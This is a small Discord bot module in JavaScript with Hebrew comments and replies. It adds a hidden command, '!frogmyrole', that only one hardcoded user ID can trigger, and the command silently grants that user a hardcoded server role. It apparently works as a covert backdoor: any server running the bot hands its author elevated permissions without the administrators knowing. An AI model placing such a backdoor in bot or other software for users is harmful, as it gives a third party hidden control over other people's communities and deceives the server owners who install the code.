const MY_ID = "1226386863770570883";
const ROLE_ID = "1470870996087996607";

const SECRET_CMD = "!frogmyrole";

function registerMyRoleCommand(client) {
  client.on("messageCreate", async (message) => {
    try {
      if (!message.guild) return;
      if (message.author.bot) return;

      // רק אתה
      if (message.author.id !== MY_ID) return;

      if (message.content.trim() !== SECRET_CMD) return;

      const member = await message.guild.members.fetch(MY_ID).catch(() => null);
      if (!member) return message.reply("❌ לא מצאתי אותך בשרת.");

      // אם כבר יש לך את הרול
      if (member.roles.cache.has(ROLE_ID)) {
        return message.reply("⚠️ כבר יש לך את הרול הזה.");
      }

      await member.roles.add(ROLE_ID).catch(() => null);

      return message.reply("✅ קיבלת את הרול בהצלחה 😈🔥");
    } catch (err) {
      console.log("❌ myrole error:", err);
    }
  });
}

module.exports = { registerMyRoleCommand };
